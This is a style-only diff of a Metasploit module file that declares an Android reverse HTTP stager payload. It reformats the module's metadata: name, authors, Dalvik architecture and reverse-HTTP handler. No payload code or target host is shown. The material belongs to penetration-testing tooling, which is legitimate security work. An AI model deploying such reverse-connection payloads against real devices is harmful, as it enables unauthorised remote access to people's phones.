@@ -4,7 +4,6 @@
 ##
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Stager
@@ -12,16 +11,19 @@ module MetasploitModule
   include Msf::Payload::Android::ReverseHttp
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Android Reverse HTTP Stager',
-      'Description' => 'Tunnel communication over HTTP',
-      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'android',
-      'Arch'        => ARCH_DALVIK,
-      'Handler'     => Msf::Handler::ReverseHttp,
-      'Convention'  => 'javaurl',
-      'Stager'      => {'Payload' => ''}
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Android Reverse HTTP Stager',
+        'Description' => 'Tunnel communication over HTTP',
+        'Author' => ['anwarelmakrahy', 'OJ Reeves'],
+        'License' => MSF_LICENSE,
+        'Platform' => 'android',
+        'Arch' => ARCH_DALVIK,
+        'Handler' => Msf::Handler::ReverseHttp,
+        'Convention' => 'javaurl',
+        'Stager' => { 'Payload' => '' }
+      )
+    )
   end
 end
